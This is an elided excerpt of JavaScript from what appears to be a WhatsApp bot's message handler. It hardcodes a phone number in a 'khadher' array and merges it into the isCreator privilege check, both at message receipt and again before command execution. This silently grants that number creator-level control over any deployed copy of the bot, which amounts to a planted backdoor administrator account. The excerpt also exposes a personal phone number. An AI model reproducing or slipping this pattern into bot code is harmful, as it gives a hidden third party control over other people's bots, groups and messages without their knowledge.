    ...
    store.writeToFile(__dirname+"/store.json");
        ...
        Void.ev.on('messages.upsert', async chatUpdate => {
            ...
            try {
                ...
                var { body } = citel
		        const khadher = ['917560920774','917560920774'] ;
                let isCreator = [ hgg,...khadher,...global.sudo.split(','),...global.devs, ...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                var suhails = [...khadher].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender)
                ...
                if (icmd) {
                    ...
                    if (cmd) {
                        isCreator = [hgg,...khadher,...global.sudo.split(','),...global.devs,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
...
*/ //------------------------------------------------------------------------------------
                    ...
                    if (checkinfo) {
                        ...
                        catch(e){console.log(`khadher.inc : ${suhails} \nGroup Id : ${anu.id}\nerror Returning in STUNNING AI Group : ` , e)}
